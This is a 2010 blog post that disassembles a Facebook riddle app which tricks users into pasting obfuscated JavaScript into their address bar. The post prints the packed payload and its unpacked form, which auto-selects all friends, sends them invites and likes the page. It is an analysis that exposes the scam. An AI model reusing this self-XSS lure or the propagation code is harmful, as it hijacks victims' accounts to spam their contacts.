---
layout: post
title: "Shady Harvard Puzzle Facebook App Disassembled"
date: 2010-04-26 22:32:33 +0000
permalink: /en/shady-harvard-puzzle-facebook-app-disassembled
blog: en
tags: javascript
render_with_liquid: false
---

Today I got an email from a friend on Facebook that suggested that I try
out this application called "[Only 4% of harvard grads can solve this
riddle..](http://www.facebook.com/pages/Only-4-of-harvard-grads-can-solve-this-riddle/112049325499228?v=wall)".
Being curious I took a look at it.

The app starts out innocently enough, posing a riddle that supposedly
only 4% of Harvard grads can guess.

![image](http://farm5.static.flickr.com/4062/4554647376_5a38c707a8.jpg)

But in order to see the answer it asks you to type "Ctrl-C" to copy some
javascript, "Alt-D" to select your address bar, and "Ctrl-V Enter" to
run the javascript.

Here is the beautified packed javascript.

```javascript
javascript: (function () {
  a = "app112010525500764_jop";
  b = "app112010525500764_jode";
  ifc = "app112010525500764_ifc";
  ifo = "app112010525500764_ifo";
  mw = "app112010525500764_mwrapper";
  eval(
    (function (p, a, c, k, e, r) {
      e = function (c) {
        return (
          (c < a ? "" : e(parseInt(c / a))) +
          ((c = c % a) > 35 ? String.fromCharCode(c + 29) : c.toString(36))
        );
      };
      if (!"".replace(/^/, String)) {
        while (c--) r[e(c)] = k[c] || e(c);
        k = [
          function (e) {
            return r[e];
          },
        ];
        e = function () {
          return "\\w+";
        };
        c = 1;
      }
      while (c--)
        if (k[c]) p = p.replace(new RegExp("\\b" + e(c) + "\\b", "g"), k[c]);
      return p;
    })(
      'J e=["\\n\\g\\j\\g\\F\\g\\i\\g\\h\\A","\\j\\h\\A\\i\\f","\\o\\f\\h\\q\\i\\f\\r\\f\\k\\h\\K\\A\\L\\t","\\w\\g\\t\\t\\f\\k","\\g\\k\\k\\f\\x\\M\\N\\G\\O","\\n\\l\\i\\y\\f","\\j\\y\\o\\o\\f\\j\\h","\\i\\g\\H\\f\\r\\f","\\G\\u\\y\\j\\f\\q\\n\\f\\k\\h\\j","\\p\\x\\f\\l\\h\\f\\q\\n\\f\\k\\h","\\p\\i\\g\\p\\H","\\g\\k\\g\\h\\q\\n\\f\\k\\h","\\t\\g\\j\\z\\l\\h\\p\\w\\q\\n\\f\\k\\h","\\j\\f\\i\\f\\p\\h\\v\\l\\i\\i","\\j\\o\\r\\v\\g\\k\\n\\g\\h\\f\\v\\P\\u\\x\\r","\\B\\l\\Q\\l\\R\\B\\j\\u\\p\\g\\l\\i\\v\\o\\x\\l\\z\\w\\B\\g\\k\\n\\g\\h\\f\\v\\t\\g\\l\\i\\u\\o\\S\\z\\w\\z","\\j\\y\\F\\r\\g\\h\\T\\g\\l\\i\\u\\o"];d=U;d[e[2]](V)[e[1]][e[0]]=e[3];d[e[2]](a)[e[4]]=d[e[2]](b)[e[5]];s=d[e[2]](e[6]);m=d[e[2]](e[7]);c=d[e[9]](e[8]);c[e[11]](e[10],I,I);s[e[12]](c);C(D(){W[e[13]]()},E);C(D(){X[e[16]](e[14],e[15])},E);C(D(){m[e[12]](c);d[e[2]](Y)[e[4]]=d[e[2]](Z)[e[5]]},E);',
      62,
      69,
      "||||||||||||||_0x95ea|x65|x69|x74|x6C|x73|x6E|x61||x76|x67|x63|x45|x6D||x64|x6F|x5F|x68|x72|x75|x70|x79|x2F|setTimeout|function|5000|x62|x4D|x6B|true|var|x42|x49|x48|x54|x4C|x66|x6A|x78|x2E|x44|document|mw|fs|SocialGraphManager|ifo|ifc|||||||".split(
        "|",
      ),
      0,
      {},
    ),
  );
})();
```

Here we have some javascript code that is packed. The above code unpacks
the packed code and evals it. I replaced the above eval with console.log
and ran the code to output the packed code. Here it is beautified.

```javascript
d = document;
d["getElementById"](mw)["style"]["visibility"] = "hidden";
d["getElementById"](a)["innerHTML"] = d["getElementById"](b)["value"];
s = d["getElementById"]("suggest");
m = d["getElementById"]("likeme");
c = d["createEvent"]("MouseEvents");
c["initEvent"]("click", true, true);
s["dispatchEvent"](c);
setTimeout(function () {
  fs["select_all"]();
}, 5000);
setTimeout(function () {
  SocialGraphManager["submitDialog"](
    "sgm_invite_form",
    "/ajax/social_graph/invite_dialog.php",
  );
}, 5000);
setTimeout(function () {
  m["dispatchEvent"](c);
  d["getElementById"](ifo)["innerHTML"] = d["getElementById"](ifc)["value"];
}, 5000);
```

Lets go though the code above step by step.

```javascript
d["getElementById"](mw)["style"]["visibility"] = "hidden";
```

This code hides the application's main block.

```javascript
d["getElementById"](a)["innerHTML"] = d["getElementById"](b)["value"];
```

The contents of the textarea at id b ('app112010525500764_jode') is
html for a dialog to suggest the application to your friends. The code
inserts it into a block on the page.

```html
<textarea
  id="app112010525500764_jode"
  style="display: none;"
  fbcontext="86d477030eb0"
>
  <div class="suggestdiv">
    <a id="suggest" href="#" ajaxify="/ajax/social_graph/invite_dialog.php?class=FanManager&node_id=112049325499228" class=" profile_action actionspro_a" rel="dialog-post">Suggest to Friends</a>
  </div>
  <div class="likemediv">
    <a ajaxify="/ajax/pages/fan_status.php?fbpage_id=112049325499228&add=1&reload=0&preserve_tab=1&use_primer=1" id="likeme" rel="async-post" class="UIButton UIButton_Gray UIButton_CustomIcon UIActionButton" href="#">
    <span class="UIButton_Text"><i class="UIButton_Icon img spritemap_icons sx_icons_like"></i>Like</span></a>
  </div>
</textarea>
```

The next code sets up a mouse click event and selects some elements from
the suggest box.

```javascript
s = d["getElementById"]("suggest");
m = d["getElementById"]("likeme");
c = d["createEvent"]("MouseEvents");
c["initEvent"]("click", true, true);
s["dispatchEvent"](c);
```

The code below is the shady part. It sets 5 second timers that will
click items on the suggestion box, effectively selecting all of your
friends and suggesting the application to them. It then likes the
application.

```javascript
setTimeout(function () {
  fs["select_all"]();
}, 5000);
setTimeout(function () {
  SocialGraphManager["submitDialog"](
    "sgm_invite_form",
    "/ajax/social_graph/invite_dialog.php",
  );
}, 5000);
setTimeout(function () {
  m["dispatchEvent"](c);
  d["getElementById"](ifo)["innerHTML"] = d["getElementById"](ifc)["value"];
}, 5000);
```

As of this writing 543 people had liked the application which I take to
mean that 543 people followed the instructions on the application. The
application itself doesn't do anything particularly bad besides spam all
of your friends so I took it to be a security research application.
Anyone else have a better take on it?
